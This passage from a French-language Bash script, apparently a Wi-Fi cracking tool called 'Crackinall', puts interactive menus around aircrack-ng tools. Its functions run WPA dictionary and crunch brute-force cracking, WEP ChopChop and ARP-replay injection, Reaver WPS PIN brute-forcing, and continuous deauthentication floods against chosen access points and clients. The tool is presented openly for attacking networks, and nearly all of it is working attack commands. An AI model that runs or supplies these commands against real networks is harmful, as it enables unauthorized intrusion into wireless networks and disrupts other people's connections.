	echo -e " \033[36m\033[1mMauvaise syntaxe d'attaque, veuillez réessayer... [arp/chopchop/stop] :\033[0m "
	echo
	read var_attack
done

while [ $var_attack != "arp" ] && [ $var_attack != "chopchop" ] && [ $var_attack != "stop" ]
do 
	echo
	echo -e " \033[36m\033[1mMauvaise syntaxe d'attaque, veuillez réessayer... [arp/chopchop/stop]:\033[0m "
	echo
	read var_attack
done

}
#### Limitation varwep 


#### Limitation varwep3 
function lim_varwep3 {

while [ -z $var_attack ]
do 
	echo
	echo -e " \033[36m\033[1mMauvaise syntaxe d'attaque, veuillez réessayer... [arp/stop] :\033[0m "
	echo
	read var_attack
done

while [ $var_attack != "arp" ] && [ $var_attack != "stop" ]
do 
	echo
	echo -e " \033[36m\033[1mMauvaise syntaxe d'attaque, veuillez réessayer... [arp/stop]:\033[0m "
	echo
	read var_attack
done

}
#### Limitation varwep3


#### Limitation varwep4
function lim_varwep4 {

while [ -z $var_attack ]
do 
	echo
	echo -e " \033[36m\033[1mMauvaise syntaxe d'attaque, veuillez réessayer... [chochop/stop] :\033[0m "
	echo
	read var_attack
done

while [ $var_attack != "chopchop" ] && [ $var_attack != "stop" ]
do 
	echo
	echo -e " \033[36m\033[1mMauvaise syntaxe d'attaque, veuillez réessayer... [chopchop/stop] :\033[0m "
	echo
	read var_attack
done

}
#### Limitation varwep4


#### Limitation essid 
function lim_essid {

while [ -z $essid ]
do 
	echo
	echo -e " \033[36m\033[1mMauvais ESSID, veuillez recommencer... :\033[0m "
	echo
	read essid
done
}
#### Limitation essid 


#### Limitation var_reaver
function lim_varreaver {

while [ -z $var_reaver ]
do 
	echo
	echo -e " \033[36m\033[1mMauvais choix, veuillez réessayer... :\033[0m "
	echo
	read var_reaver
done

while [ $var_reaver != "n" ] && [ $var_reaver != "Y" ] 
do 
	echo
	echo -e " \033[36m\033[1mMauvais choix, veuillez réessayer... :\033[0m "
	echo
	read var_reaver
done

}
#### Limitation var_reaver


#### Limitation var_suivant
function lim_varsuivant {

while [[ -z $suivant ]]
do 
	echo
	echo -e " \033[36m\033[1mMauvais choix, veuillez réessayer... :\033[0m " 
	echo
	read suivant
done

while [[ $suivant != "n" ]] && [[ $suivant != "Y" ]] && [[ $suivant != "Stop" ]]
do 
	echo
	echo -e " \033[36m\033[1mMauvais choix, veuillez réessayer... :\033[0m "
	echo
	read suivant
done

}
#### Limitation var_suivant


#### Limitation var_suivant2

function lim_varsuivant2 {

while [ -z $suivant ]
do 
	echo
	echo -e " \033[36m\033[1mMauvais choix, veuillez réessayer... :\033[0m " 
	echo
	read suivant
done

while [ $suivant != "n" ] && [ $suivant != "Y" ] 
do 
	echo
	echo -e " \033[36m\033[1mMauvais choix, veuillez réessayer... :\033[0m "
	echo
	read suivant
done

}
#### Limitation var_suivant2


#### Limitation var_suivant3
function lim_varsuivant3 {

while [ -z $suivant3 ]
do 
	echo
	echo -e " \033[36m\033[1mMauvais choix, veuillez réessayer... :\033[0m " 
	echo
	read suivant3
done

while [ $suivant3 != "n" ] && [ $suivant3 != "Y" ] 
do 
	echo
	echo -e " \033[36m\033[1mMauvais choix, veuillez réessayer... :\033[0m "
	echo
	read suivant3
done

}
#### Limitation var_suivant3


#### Limitation attaque_wpa
function lim_wpa {

while [ -z $attaque_wpa ]
do 
	echo
	echo -e " \033[36m\033[1mMauvaise syntaxe, veuillez réessayer... [bruteforce/dictionnaire]\033[0m : "
	echo
	read attaque_wpa
done

while [ $attaque_wpa != "bruteforce" ] && [ $attaque_wpa != "dictionnaire" ] && [ $attaque_wpa != "stop" ]
do 
	echo
	echo -e " \033[36m\033[1mMauvaise syntaxe, veuillez réessayer... [bruteforce/dictionnaire]\033[0m : "
	echo
	read attaque_wpa
done

}
#### Limitation attaque_wpa


#### Limitation attaque_wpa2
function lim_wpa2 {

while [ -z $attaque_wpa ]
do 
	echo
	echo -e " \033[36m\033[1mMauvaise syntaxe, veuillez réessayer... [bruteforce/stop]\033[0m : "
	echo
	read attaque_wpa
done

while [ $attaque_wpa != "bruteforce" ] && [ $attaque_wpa != "stop" ]
do 
	echo
	echo -e " \033[36m\033[1mMauvaise syntaxe, veuillez réessayer... [bruteforce/stop]\033[0m : "
	echo
	read attaque_wpa
done

}
#### Limitation attaque_wpa2

#### Limitation attaque_wpa3
function lim_wpa3 {

while [ -z $attaque_wpa ]
do 
	echo
	echo -e " \033[36m\033[1mMauvaise syntaxe, veuillez réessayer... [dictionnaire/stop]\033[0m : "
	echo
	read attaque_wpa
done

while [ $attaque_wpa != "dictionnaire" ] && [ $attaque_wpa != "stop" ]
do 
	echo
	echo -e " \033[36m\033[1mMauvaise syntaxe, veuillez réessayer... [dictionnaire/stop]\033[0m : "
	echo
	read attaque_wpa
done

}
#### Limitation attaque_wpa3

#### limitation des réponses utilisateurs var_T 
function lim_varT {

while [ -z $var_T ]
do 
	echo
	echo -e " \033[36m\033[1mMauvais M5/M7 timeout period, veuillez recommencer... :\033[0m "
	echo	
	read var_T
	
done
}
#### limitation des réponses utilisateurs var_T 

#### limitation des réponses utilisateurs var_t
function lim_vart {

while [ -z $var_t ]
do 
	echo
	echo -e " \033[36m\033[1mMauvais receive timeout period, veuillez recommencer... :\033[0m " 
	echo 
	read var_t
done
}
#### limitation des réponses utilisateurs var_t


function lim_attack_dico {

echo -e "$intro_menu98"
echo
echo -e "\033[33m\033[1m=> Lancer attaque WPA - Dictionnaire / Revenir au menu principal [dictionnaire/stop] ?\033[0m "
echo
read attaque_wpa
echo

############## limitation des réponses utilisateurs attaque_wpa
lim_wpa3
############## limitation des réponses utilisateurs attaque_wpa

			while [ "$attaque_wpa" = "dictionnaire" ]; do

					echo
					echo -e "\033[33m\033[1m Sélectionner un chemin pour création des logs : [Ex : /root/crackilogs/crackinall_varlogsdico.txt] \033[0m  "
					echo
					read var_dico

					echo
					echo -e "$intro4" 	
					echo
					echo -e " \033[33m\033[1m=> Liste des fichiers cap valides ? [Format accepté : XXXXX]\033[0m " 
					echo
					ls /root/fichierscap/*.cap
					echo
					echo -e " \033[33m\033[1m=> Choix du fichier cap (chemin prérempli, avec extension...)- exemple XXXXX-0x.cap\033[0m"
					echo 	
					read fichier_cap 
					echo

					############### Limitation du choix utilisateur pour $fichier_cap
					lim_cap2
					############### Limitation du choix utilisateur pour $fichier_cap

					echo
					echo -e " \033[33m\033[1m=> Liste des dictionnaires disponibles [/root/Dictionnaires/lourds]\033[0m " 
					echo
					ls /root/Dictionnaires/lourds
					echo
					echo -e " \033[33m\033[1m=> Liste des dictionnaires disponibles [/root/Dictionnaires/mini]\033[0m " 
					echo
					ls /root/Dictionnaires/mini
					echo
					echo -e " \033[33m\033[1m=> Liste des dictionnaires disponibles [/root/Dictionnaires/moyens]\033[0m " 
					echo
					ls /root/Dictionnaires/moyens
					echo
					echo -e " \033[33m\033[1m=> Liste des dictionnaires disponibles [/root/Dictionnaires/petits]\033[0m " 
					echo
					ls /root/Dictionnaires/petits
					echo
					echo -e " \033[33m\033[1m=> Liste des dictionnaires disponibles [/root/Dictionnaires/rdy2giga]\033[0m " 
					echo
					ls /root/Dictionnaires/rdy2giga
					echo
					echo -e " \033[33m\033[1m=> Liste des dictionnaires disponibles [/root/Dictionnaires/rdy2use]\033[0m " 
					echo
					ls /root/Dictionnaires/rdy2use
					echo
					echo -e " \033[33m\033[1m=> Choix du fichier dictionnaire (chemin complet !)\033[0m"
					echo
					read dico
					echo

					xterm -T "[$dico $fichier_cap]" -e "aircrack-ng -w $dico /root/fichierscap/$fichier_cap; $SHELL" &
					
					################# Génération des logs
					echo -e " Attaque Dictionnaire - Génération des logs : " >> $var_dico
					echo >> $var_dico
					echo -e "$bssid $var_interface $var_canal $dico $fichier_cap" >> $var_dico
					################# Génération des logs
								

					echo
					echo -e " \033[33m\033[1m=> Relancer une autre attaque WPA - Dictionnaire / Revenir au menu principal [dictionnaire/stop] ?\033[0m"
					echo
					read attaque_wpa
					echo

					############## limitation des réponses utilisateurs
					lim_wpa3
					############## limitation des réponses utilisateurs

			done
}

function lim_fin {

	echo -e '\033[1m\n\E[2KCtrl+C pressed... Stopping Crackinall... Restoring interface initial mode !\033[0m'
	echo
	echo -e " \033[31m\033[1m--------------------------------------------------- 		Arrêt du script        ---------------------------------------------------------------\033[0m"
	echo
  	echo -e "  => \033[1mRedémarrage de NetworkManager : \033[0m"
	echo
	NetworkManager Restart
	echo
	echo -e " 	=> \033[1mNetworkManager \033[32m\033[1mOK\033[0m "
	echo
	echo -e "  => \033[1mPassages des interfaces en mode managed : \033[0m"
	echo
		ifconfig wlan0 down
		iwconfig wlan0 mode managed
		ifconfig wlan0 up
		ifconfig wlan1 down
		iwconfig wlan1 mode managed
		ifconfig wlan1 up

	echo
	echo -e "	=> \033[1mAll Interfaces Mode Managed \033[32m\033[1mOK\033[0m" 
	echo
	echo -e " \033[31m\033[1m---------------------------------------------------- 		Arrêt du script        ---------------------------------------------------------------\033[0m"
	echo
	sleep 2
}

function lim_bruteforce {

echo -e "$intro_menu97"
echo
echo -e "\033[33m\033[1m=> Lancer attaque WPA - Bruteforce / Revenir au menu principal [bruteforce/stop] ?\033[0m "
echo
read attaque_wpa
echo

############## limitation des réponses utilisateurs attaque_wpa
lim_wpa2
############## limitation des réponses utilisateurs attaque_wpa

			while [ "$attaque_wpa" = "bruteforce" ]; do

										echo
					echo -e "\033[33m\033[1m Sélectionner un chemin pour création des logs : [Ex : /root/crackilogs/crackinall_varlogscrunch.txt] \033[0m  "
					echo
					read var_crunch

					echo
					echo	
					echo -e "$intro6"	
					echo
					echo -e " \033[33m\033[1m=> Liste des fichiers cap valides ? [Format accepté : XXXXX]\033[0m " 
					echo
					ls /root/fichierscap/*.cap
					echo	
					echo -e " \033[33m\033[1m=> Choix du fichier cap (chemin prérempli, avec extension)- [Format accepté : XXXXX-0x.cap] : \033[0m"
					echo
					read fichier_cap 
					echo
					echo

					############### Limitation du choix utilisateur pour $fichier_cap
					lim_cap2
					############### Limitation du choix utilisateur pour $fichier_cap

					echo
					echo -e " \033[33m\033[1m=> Choix taille minimum ?\033[0m "
					echo
					read min
					echo	
					echo -e " \033[33m\033[1m=> Choix taille maximum ?\033[0m "
					echo
					read max
					echo
					echo -e " \033[33m\033[1m=> Choix de la liste de caractères ?\033[0m "
					echo
					echo -e " \033[32m\033[1m	=> Ouverture de charset.lst...\033[0m" 
					xterm -T "charset.lst" -e "echo '$charset'; $SHELL" &
					echo
					read liste_char
					echo
					
					echo -e " \033[33m\033[1m=> ESSID ?\033[0m "
					echo
					read essid 
					echo

					############### Limitation du choix utilisateur ESSID
					lim_essid
					############### Limitation du choix utilisateur ESSID

					echo	
					xterm -T "Crunch $max $min $liste_char $essid $fichier_cap" -e "crunch $min $max $liste_char --stdout | aircrack-ng -e $essid -w - /root/fichierscap/$fichier_cap; $SHELL" &

					################# Génération des logs
					echo -e " Attaque Bruteforce - Génération des logs : " >> $var_crunch
					echo >> $var_crunch
					echo -e "$bssid $essid $list_char $var_interface $var_canal $max $min $fichier_cap" >> $var_crunch
					################# Génération des logs

					echo
					echo -e " \033[33m\033[1m=> Relancer une autre attaque WPA / Revenir au menu principal [bruteforce/stop] ?\033[0m"
					echo
					read attaque_wpa
					echo

					############## limitation des réponses utilisateurs
					lim_wpa2
					############## limitation des réponses utilisateurs

			done
}

function lim_chopchop {

echo -e "$intro_menu95"
echo
echo -e "\033[33m\033[1m=> Lancer attaque WEP - CHOPCHOP / Revenir au menu principal [chopchop/stop] ?\033[0m "
echo
echo -e "\033[34m\033[1mAstuce : Si vous ne connaissez pas les paramètres de la cible, il est recommandé de lancer une écoute précise (Menus 3 & 4) afin d'acquérir les paramètres nécessaire à une attaque CHOPCHOP [chochop/stop].\033[0m "
echo
read var_attack
echo

############## limitation des réponses utilisateurs var_reaver
lim_varwep4
############## limitation des réponses utilisateurs var_reaver

	while [ $var_attack = "chopchop" ]; do


					echo -e "\033[33m\033[1m=> Choix d'un ESSID :\033[0m "
					echo
					read essid
					echo

					############### limitation des réponses utilisateurs essid
					lim_essid
					############### limitation des réponses utilisateurs essid

					echo
					echo -e "\033[33m\033[1m=> Choix d'un nouvel BSSID :\033[0m "
					echo
					read bssid
					echo

					################limitation des réponses utilisateurs bssid
					lim_bssid
					################limitation des réponses utilisateurs bssid

					echo
					echo -e "\033[33m\033[1m=> Choix d'une nouvelle station :\033[0m "
					echo
					read station
					echo

					################ Limitation du choix utilisateur $station
					lim_station
					################ Limitation du choix utilisateur $station

					echo
					echo -e "\033[33m\033[1m=> Choix d'une nouvelle interface :\033[0m "
					echo
					read var_interface
					echo

					#################### Limitation des réponses utilisateurs var_interface
					lim_interfaces
					#################### Limitation des réponses utilisateurs var_interface

			echo

			xterm -T "[1/2] $essid / $bssid / $station / $var_interface" -e "aireplay-ng -1 0 $var_interface -e $essid -a $bssid -h $station; $SHELL" &
			xterm -T "[2/2] $essid / $bssid / $station / $var_interface" -e "aireplay-ng -4 $var_interface -a $bssid -h $station; $SHELL" &


			############### Condition passage étape suivante
		
			echo -e " \033[34m\033[1m=> Passer à l'étape suivante ? [n/Y]\033[0m"
			echo

			read suivant 
			echo

			################ Limitation des choix utilisateurs suivant
			lim_varsuivant
			################ Limitation des choix utilisateurs suivant

				while [ "$suivant" == "n" ]; do
		
					echo -e "\033[32m\033[1m=> [REDEFINITION DES PARAMETRES POUR LA PROCHAINE ETAPE]\033[0m "
					echo
					echo -e "\033[33m\033[1m=> Choix d'un nouvel ESSID :\033[0m "
					echo
					read essid
					echo

					############### limitation des réponses utilisateurs essid
					lim_essid
					############### limitation des réponses utilisateurs essid

					echo
					echo -e "\033[33m\033[1m=> Choix d'un nouvel BSSID :\033[0m "
					echo
					read bssid
					echo
					
					################limitation des réponses utilisateurs bssid
					lim_bssid
					################limitation des réponses utilisateurs bssid

					echo
					echo -e "\033[33m\033[1m=> Choix d'une nouvelle station :\033[0m "
					echo
					read station
					echo
					
					################ Limitation du choix utilisateur $station
					lim_station
					################ Limitation du choix utilisateur $station

					echo
					echo -e "\033[33m\033[1m=> Choix d'une nouvelle interface :\033[0m "
					echo
					read var_interface
					echo

					#################### Limitation des réponses utilisateurs var_interface
					lim_interfaces
					#################### Limitation des réponses utilisateurs var_interface

					echo
					echo -e "\033[33m\033[1m=> Reprise de l'attaque avec les nouveaux paramètres...[Y/n] ?\033[0m "
					echo
					read suivant
					echo	
					
					############## limitation des réponses utilisateurs
					lim_varsuivant
					############## limitation des réponses utilisateurs
				done

			
	echo
	echo -e " \033[32m\033[1m	=> Attaque Chopchop : Etape 1, ouverture d'un nouveau terminal...\033[0m" 
	xterm -T "[$var_interface / $bssid / $station] " -e "aireplay-ng -5 $var_interface -a $bssid -b $bssid -h $station; $SHELL" 


	############### Condition passage étape suivante

	echo
	echo -e " \033[34m\033[1m=> Passer à l'étape suivante ? [n/Y]\033[0m"

	read suivant 
	echo
	
	################ Limitation des choix utilisateurs suivant
	lim_varsuivant
	################ Limitation des choix utilisateurs suivant

			while [ "$suivant" == "n" ]; do

				echo -e "\033[32m\033[1m=> [REDEFINITION DES PARAMETRES POUR LA PROCHAINE ETAPE]\033[0m "
				echo
				echo -e "\033[33m\033[1m=> Choix d'un nouvel ESSID :\033[0m "
				echo
				read essid
				echo

				############### limitation des réponses utilisateurs essid
				lim_essid
				############### limitation des réponses utilisateurs essid

				echo
				echo -e "\033[33m\033[1m=> Choix d'une nouvelle station... :\033[0m "
				read station
				echo

				################ Limitation du choix utilisateur $station
				lim_station
				################ Limitation du choix utilisateur $station

				echo
				echo -e "\033[34m\033[1m=> Reprise de l'attaque avec les nouveaux paramètres...[Y/n] ?\033[0m "
				echo
				read suivant
				echo	

				############## limitation des réponses utilisateurs
				lim_varsuivant
				############## limitation des réponses utilisateurs
	
			done

	echo -e " \033[32m\033[1m	=> Attaque Chopchop : Etape 2, ouverture d'un nouveau terminal...\033[0m" 
	xterm -T "Packetforge...[$bssid / $station]" -e "packetforge-ng -0 -a $bssid -h $station -k 192.168.1.1 -l 192.168.1.10 -y .xor -w arp.cap; $SHELL" &




	############### Condition passage étape suivante

	echo
	echo -e " \033[34m\033[1m=> Passer à l'étape suivante ? [n/Y]\033[0m"
	echo
	read suivant
	echo

	################ Limitation des choix utilisateurs suivant
	lim_varsuivant
	################ Limitation des choix utilisateurs suivant

			while [ "$suivant" == "n" ]; do

				echo -e "\033[32m\033[1m=> [REDEFINITION DES PARAMETRES POUR LA PROCHAINE ETAPE]\033[0m "
				echo
				echo -e "\033[33m\033[1m=> Choix d'un nouvel ESSID :\033[0m "
				echo
				read essid
				echo

				############### limitation des réponses utilisateurs essid
				lim_essid
				############### limitation des réponses utilisateurs essid

				echo
				echo -e "\033[33m\033[1m=> Choix d'un nouvel BSSID :\033[0m "
				echo
				read bssid
				echo

				################limitation des réponses utilisateurs bssid
				lim_bssid
				################limitation des réponses utilisateurs bssid

				echo
				echo -e "\033[33m\033[1m=> Choix d'une nouvelle station :\033[0m "
				echo
				read station
				echo

				################ Limitation du choix utilisateur $station
				lim_station
				################ Limitation du choix utilisateur $station

				echo
				echo -e "\033[33m\033[1m=> Choix d'une nouvelle interface :\033[0m "
				echo
				read var_interface
				echo

				#################### Limitation des réponses utilisateurs var_interface
				lim_interfaces
				#################### Limitation des réponses utilisateurs var_interface

				echo
				echo -e "\033[33m\033[1m=> Reprise de l'attaque avec les nouveaux paramètres...[Y/n] ? \033[0m "
				echo
				read suivant
				echo	

				############## limitation des réponses utilisateurs
				lim_varsuivant
				############## limitation des réponses utilisateurs

			done

	echo
	echo -e " \033[32m\033[1m	=> Attaque Chopchop : Etape 3, ouverture d'un nouveau terminal...\033[0m" 
	xterm -T "[$essid / $bssid / $station]" -e "aireplay-ng -3 -e $essid -a $bssid -h $station -x600 -r arp.cap $var_interface; $SHELL" &

	############### Condition passage étape suivante


	echo
	echo -e " \033[34m\033[1m=> Passer à l'étape suivante ? [n/Y]\033[0m"
	echo 
	read suivant
	echo

	################ Limitation des choix utilisateurs suivant
	lim_varsuivant
	################ Limitation des choix utilisateurs suivant

			while [ "$suivant" == "n" ]; do
	
				echo -e "\033[32m\033[1m=> [REDEFINITION DES PARAMETRES POUR LA PROCHAINE ETAPE]\033[0m "
				echo
				echo -e " \033[33m\033[1m=> Liste des fichiers cap valides ? [Format accepté : XXXXX]\033[0m " 
				echo
				ls /root/fichierscap/*.cap
				echo
				echo -e "\033[33m\033[1m=> Choix d'un nouveau fichier_cap :\033[0m "
				echo
				read fichier_cap
				echo

				################### Limitation des choix utilisateurs fichier_cap 
				lim_cap2
				################### Limitation des choix utilisateurs fichier_cap

				echo
				echo -e "\033[34m\033[1m=> Reprise de l'attaque avec les nouveaux paramètres...[Y/n] ? \033[0m "
				echo
				read suivant

				echo	

				############## limitation des réponses utilisateurs
				lim_varsuivant
				############## limitation des réponses utilisateurs

			done
		
	echo
	echo -e " \033[32m\033[1m	=> Attaque Chopchop : Etape 4, ouverture d'un nouveau terminal...\033[0m" 
	xterm -T "Aircrack-ng [$fichier_cap]" -e "aircrack-ng /root/fichierscap/$fichier_cap; $SHELL" &

	echo
	echo -e " \033[34m\033[1m=> Relancer une autre attaque WEP - CHOCHOP / Revenir au menu principal [chopchop/stop] ?\033[0m"
	echo
	read var_attack
	echo

	################## limitation des réponses utilisateurs var_attack
	lim_varwep4
	################## limitation des réponses utilisateurs var_attack

	done
}

function lim_arp {

echo -e "$intro_menu96"
echo
echo -e "\033[33m\033[1m=> Lancer attaque WEP - ARP / Revenir au menu principal [arp/stop] ?\033[0m "
echo
echo -e "\033[31m\033[1mAvertissement : Si vous ne connaissez pas les paramètres de la cible, il est recommandé de lancer une écoute précise (Menus 3 & 4) afin d'acquérir les paramètres nécessaire à une attaque ARP [arp/stop].\033[0m "
echo
read var_attack
echo

############## limitation des réponses utilisateurs var_attack
lim_varwep3
############## limitation des réponses utilisateurs var_attack


	while [ $var_attack = "arp" ]; do

					echo
					echo -e "\033[33m\033[1m=> Choix d'un BSSID :\033[0m "
					echo
					read bssid
					echo
					
					################limitation des réponses utilisateurs bssid
					lim_bssid
					################limitation des réponses utilisateurs bssid

					echo
					echo -e "\033[33m\033[1m=> Choix d'une station :\033[0m "
					echo
					read station
					echo

					################ Limitation du choix utilisateur $station
					lim_station
					################ Limitation du choix utilisateur $station

					echo
					echo -e "\033[33m\033[1m=> Choix d'une interface :\033[0m "
					echo
					read var_interface
					echo

					#################### Limitation des réponses utilisateurs var_interface
					lim_interfaces
					#################### Limitation des réponses utilisateurs var_interface


			xterm -T "ARP [$bssid / $station / $var_interface]" -e "aireplay-ng -1 0 -a $bssid -b $bssid -h $station $var_interface; $SHELL" &

			############### Condition passage étape suivante

			echo -e "\033[34m\033[1m=> Passer à l'étape suivante ? [n/Y]\033[0m"
			echo
			read suivant 
			echo

			################ Limitation des choix utilisateurs suivant
			lim_varsuivant
			################ Limitation des choix utilisateurs suivant

			echo

					while [ "$suivant" == "n" ]; do
		
						echo -e "\033[32m\033[1m=> [REDEFINITION DES PARAMETRES POUR LA PROCHAINE ETAPE]\033[0m "
						echo
						echo -e "\033[33m\033[1m=> Choix d'un nouvel ESSID :\033[0m "
						echo
						read essid
						echo

						############### limitation des réponses utilisateurs essid
						lim_essid
						############### limitation des réponses utilisateurs essid

						echo
						echo -e "\033[33m\033[1m=> Choix d'un nouvel BSSID :\033[0m "
						echo
						read bssid
						echo

						################limitation des réponses utilisateurs bssid
						lim_bssid
						################limitation des réponses utilisateurs bssid

						echo
						echo -e "\033[33m\033[1m=> Choix d'une nouvelle station :\033[0m "
						echo
						read station
						echo

						################ Limitation du choix utilisateur $station
						lim_station
						################ Limitation du choix utilisateur $station

						echo
						echo -e " \033[33m\033[1m=> Liste des fichiers cap valides ? [Format accepté : XXXXX]\033[0m " 
						echo
						ls /root/fichierscap/*.cap
						echo
						echo -e "\033[33m\033[1m=> Choix d'un nouveau fichier_cap :\033[0m "
						echo
						read fichier_cap
						echo

						################### Limitation des choix utilisateurs fichier_cap 
						lim_cap2
						################### Limitation des choix utilisateurs fichier_cap

						echo
						echo -e "\033[33m\033[1m=> Choix d'une nouvelle interface...\033[0m "
						echo
						read var_interface
						echo

						#################### Limitation des réponses utilisateurs var_interface
						lim_interfaces
						#################### Limitation des réponses utilisateurs var_interface

						echo
						echo -e "\033[34m\033[1m=> Reprise de l'attaque avec les nouveaux paramètres...[Y/n] ? \033[0m "
						echo

						echo
						read suivant

						echo
	
						############## limitation des réponses utilisateurs
						lim_varsuivant
						############## limitation des réponses utilisateurs

					done
				

			echo -e " \033[32m\033[1m	=> Attaque ARP Injection : Etape 2, ouverture d'un nouveau terminal...\033[0m"
			xterm -T " ARP [$essid / $bssid / $station / $fichier_cap / $var_interface]" -e "aireplay-ng -3 -e $essid -a $bssid -b $bssid -h $station -x 600 -r /root/fichierscap/$fichier_cap $var_interface; $SHELL" &


			############### Condition passage étape suivante

			echo
			echo -e "\033[34m\033[1m=> Passer à l'étape suivante ? [n/Y]\033[0m"
			echo
			read suivant
			echo

			################ Limitation des choix utilisateurs suivant
			lim_varsuivant
			################ Limitation des choix utilisateurs suivant
						
							
					while [ "$suivant" == "n" ]; do

						echo
						echo -e "\033[32m\033[1m=> [REDEFINITION DES PARAMETRES POUR LA PROCHAINE ETAPE]\033[0m "
						echo
						echo -e " \033[33m\033[1m=> Liste des fichiers cap valides ? [Format accepté : XXXXX]\033[0m " 
						echo
						ls /root/fichierscap/*.cap
						echo
						echo -e "\033[33m\033[1m=> Choix d'un nouveau fichier_cap :\033[0m "
						echo
						read fichier_cap
						echo

						################### Limitation des choix utilisateurs fichier_cap 
						lim_cap2
						################### Limitation des choix utilisateurs fichier_cap

						echo
						echo -e "\033[33m\033[1m=> Reprise de l'attaque avec les nouveaux paramètres...[Y/n] ?\033[0m "
						echo
						read suivant
						echo	

						############## limitation des réponses utilisateurs
						lim_varsuivant3
						############## limitation des réponses utilisateurs
					done
				

			echo
			echo -e " \033[32m\033[1m	=> Attaque ARP Injection : Etape 3, ouverture d'un nouveau terminal...\033[0m"
			xterm -T " Aircrack-ng - Injection ARP [$fichier_cap]" -e "aircrack-ng /root/fichierscap/$fichier_cap; $SHELL" &
	
			echo
			echo -e " \033[34m\033[1m=> Relancer une autre attaque WEP - ARP / Revenir au menu principal [arp/stop] ?\033[0m"
			echo
			read var_attack
			echo

			################## limitation des réponses utilisateurs var_attack
			lim_varwep3
			################## limitation des réponses utilisateurs var_attack

	done 


}

function lim_freaver {

echo -e "$intro_menu12"
echo
echo -e "\033[33m\033[1m=> Lancer attaque Reaver - Bully / Revenir au menu principal [Y/n] ?\033[0m "
echo
read var_reaver
echo

	############## limitation des réponses utilisateurs var_reaver
	lim_varreaver
	############## limitation des réponses utilisateurs var_reaver

while [ $var_reaver = "Y" ]; do

	echo -e "$intro_menu11" 
	echo
	echo -e " \033[33m\033[1m=> Choix du BSSID ? [Format accepté : XX:XX:XX:XX:XX:XX]\033[0m " 
	echo
	read bssid
	echo

	################limitation des réponses utilisateurs bssid
	lim_bssid
	################limitation des réponses utilisateurs bssid

	################# Génération des logs
	echo
	echo -e "\033[33m\033[1m Sélectionner un chemin pour création des logs : [Ex : /root/crackilogs/crackinall_varlogsreaver.txt] \033[0m  "
	echo
	read var_reaver2
	################# Génération des logs

	echo	
	echo -e " \033[33m\033[1m=> Choix de l'ESSID ?\033[0m "
	echo
	read essid
	echo

	############### limitation des réponses utilisateurs essid
	lim_essid
	############### limitation des réponses utilisateurs essid


	echo	
	echo -e " \033[33m\033[1m=> Choix d'une station random ? [Format accepté : XX:XX:XX:XX:XX:XX]\033[0m "
	echo
	read var_station
	echo 

	################ Limitation du choix utilisateur $station 
	lim_station
	################ Limitation du choix utilisateur $station 

	echo	
	echo -e " \033[33m\033[1m=> Choix du Pin de départ ?\033[0m "
	echo
	read pin
	echo	
	echo -e " \033[33m\033[1m=> Set the M5/M7 timeout period [0.40] -T ?\033[0m " 
	echo
	read var_T
	echo

	################ limitation des réponses utilisateurs var_T 
	lim_varT
	################ limitation des réponses utilisateurs var_T

	echo	
	echo -e "\033[33m\033[1m-t,--timeout=<seconds> Set the receive timeout period [10] ?\033[0m "
	echo
	read var_t
	echo
	echo

	################ limitation des réponses utilisateurs var_T 
	lim_vart
	################ limitation des réponses utilisateurs var_T

	echo
	echo -e " \033[33m\033[1m=> Choix du canal d'écoute ?\033[0m "
	echo
	read var_canal
	echo

	###################### limitation des réponses utilisateurs var_canal
	lim_varcanal
	###################### limitation des réponses utilisateurs var_canal

	echo

	#xterm -e "aireplay-ng -1 30 -e $essid -a $bssid -h $var_station $var_interface; $SHELL" & 
 	xterm -T "Attaque Reaver Pin custom [$bssid $var_canal $var_canal $var_T $var_t $pin $var_interface]" -e "reaver -b $bssid -c $var_canal -T $var_T -t $var_t -N -S -L -p $pin -i $var_interface -vv;  $SHELL" &


	################# Génération des logs
	echo -e " Attaque Reaver - Génération des logs : " >> $var_reaver2
	echo >> $var_reaver2
	echo -e "$bssid $var_interface $var_canal $dico $fichier_cap" >> $var_reaver2
	################# Génération des logs


	echo -e "\033[33m\033[1m=> Relancer une attaque Reaver - Bully / Revenir au menu principal [Y/n] ?\033[0m "
	echo
	read var_reaver
	echo 

	############## limitation des réponses utilisateurs var_reaver
	lim_varreaver
	############## limitation des réponses utilisateurs var_reaver
done

}

function lim_handshake {

	echo
	echo -e "\033[34m\033[1m[Astuce : Il est recommandé d'avoir lancer une écoute spécifique sur le réseau cible avant de procéder]\033[0m"
	echo
	echo
	echo -e " \033[33m\033[1m=> Récupérer le handshake ? [Y/n] : \033[0m "
	echo
	read suivant

	################ Limitation du choix utilisateur $station
	lim_varsuivant
	################ Limitation du choix utilisateur $station

if [[ $suivant == "Y" ]]; then

	echo
	echo -e "$intro94"
	echo	
	echo -e "\033[33m\033[1m=> Choix d'un BSSID [Format accepté : XX:XX:XX:XX:XX:XX] ? \033[0m "
	echo
	read bssid
	echo
					
	################limitation des réponses utilisateurs bssid
	lim_bssid
	################limitation des réponses utilisateurs bssid

	echo
	echo -e " \033[33m\033[1m=> Choix de la station ? [Format accepté : XX:XX:XX:XX:XX:XX] : \033[0m "
	echo
	read station 
	echo

	################ Limitation du choix utilisateur $station
	lim_station
	################ Limitation du choix utilisateur $station

	xterm -T "[1/2] $bssid / $station / $var_interface" -e "aireplay-ng -0 0 -a $bssid -c $station $var_interface; $SHELL" & 
	xterm -T "[2/2] $bssid / $station / $var_interface" -e "aireplay-ng -0 0 -a $bssid $var_interface; $SHELL" & 
	
	################# Génération des logs
	echo -e " Récupération du Handshake - Génération des logs : " >> $var_log
	echo >> $var_log
	echo -e "$bssid $station $var_interface $var_canal $fichier_cap" >> $var_log
	################# Génération des logs

	else
		echo
fi

}

function lim_spec {

echo
echo -e " \033[32m\033[1m=> ECOUTE SPECIFIQUE : \033[0m"

echo
echo -e "\033[33m\033[1m Sélectionner un chemin pour création des logs : [Ex : /root/crackilogs/crackinall_varlogs.txt] \033[0m  "
echo
read var_log

echo		
echo
echo -e " \033[33m\033[1m=> Choix du BSSID ? [Format accepté : XX:XX:XX:XX:XX:XX]\033[0m " 
echo
read bssid 
echo

################# limitation des réponses utilisateurs bssid
lim_bssid
################# limitation des réponses utilisateurs bssid

echo
echo -e " \033[33m\033[1m=> Liste des fichiers cap valides ? [Format accepté : XXXXX]\033[0m "
echo 
ls /root/fichierscap/*.cap
echo
echo -e " \033[33m\033[1m=> Nom du fichier cap ? [Format accepté : XXXXX]\033[0m " 
echo
read fichier_cap
echo

################# Limitation du choix utilisateur pour $fichier_cap
lim_cap1
################# Limitation du choix utilisateur pour $fichier_cap

